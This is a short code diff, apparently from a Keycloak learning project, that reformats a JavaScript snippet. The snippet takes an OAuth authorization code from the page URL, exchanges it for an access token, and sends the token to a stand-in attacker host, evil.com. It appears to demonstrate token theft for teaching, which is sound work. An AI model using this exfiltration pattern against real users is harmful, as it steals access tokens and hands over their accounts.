@@ -3,10 +3,9 @@ console.log(leak)
 let authorizationCode = document.location.hash.split(/&/).find(s => s.startsWith("code=")).substring("code=".length);
 console.log("Got authorization code: " + authorizationCode)
 
-$.get('keycloak.json', function(data) {
+$.get('keycloak.json', function (data) {
     console.log(data)
     let keycloakSettings = JSON.parse(data);
-
 
 
     // let div = document.createElement("div");
@@ -33,20 +32,20 @@ $.get('keycloak.json', function(data) {
 
     $.ajax("http://localhost:8180/auth/realms/LearningRealm/protocol/openid-connect/token",
         {
-        method: "POST",
-        contentType: 'application/x-www-form-urlencoded',
-        data: $.param({
-            code: authorizationCode,
-            grant_type: "authorization_code",
-            client_id: keycloakSettings.resource,
-            redirect_uri:document.location.href.split(/#/)[0],
-        }),
-        success: function(result){
-            console.log(result);
-            $.get("http://evil.com?host=victim&access_token=" + result.access_token)
-            // console.log("I can now get one access code myself and then send it to http://evil.site/got-access-token?host=..&token="+accessTo);
-        }
-    });
+            method: "POST",
+            contentType: 'application/x-www-form-urlencoded',
+            data: $.param({
+                code: authorizationCode,
+                grant_type: "authorization_code",
+                client_id: keycloakSettings.resource,
+                redirect_uri: document.location.href.split(/#/)[0],
+            }),
+            success: function (result) {
+                console.log(result);
+                $.get("http://evil.com?host=victim&access_token=" + result.access_token)
+                // console.log("I can now get one access code myself and then send it to http://evil.site/got-access-token?host=..&token="+accessTo);
+            }
+        });
 
 
 }, 'text');
